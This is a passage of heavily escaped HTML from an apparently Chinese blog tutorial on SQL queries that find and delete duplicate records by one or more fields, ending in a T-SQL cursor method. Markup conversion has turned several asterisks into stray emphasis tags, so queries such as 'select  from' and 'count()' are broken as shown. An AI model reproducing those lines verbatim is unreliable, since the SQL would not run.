#000000\">&nbsp;id&nbsp;</span><span style=\"color: #808080\">in</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;(<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tablename&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;id&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(id)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">)</font></span></div><br></div>","excerpt":"","more":"<div id=\"cnblogs_post_body\"><div><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">&nbsp;1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;例二：</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;select</font> </em> <font color=\"#0000ff\">from</font> testtable</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;where</font> numeber in (<font color=\"#0000ff\">select</font> number <font color=\"#0000ff\">from</font> people <font color=\"#0000ff\">group by</font> number <font color=\"#0000ff\">having count</font>(number) &gt; 1 )</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;可以查出testtable表中number相同的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断，只留有rowid最小的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId&nbsp;)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">3</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段）&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">4</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录（多个字段），只留有rowid最小的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">5</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段），不包含rowid最小的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(二)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">比方说<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">在A表中存在一个字段“name”，<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">而且不同记录之间的“name”值有可能会相同，<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">现在就是需要查询出在该表中的各记录之间，“name”值存在重复的项；<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果还查性别也相同大则如下:<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,sex,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name,sex&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(三)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法一<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">cursor</span><span style=\"color: #000000\">&nbsp;local&nbsp;</span><span style=\"color: #0000ff\">for</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;主字段,</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">；&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">open</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">while</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #008000\">@@fetch_status</span><span style=\"color: #808080\">=</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">begin</font></span><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">-</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br><br><font 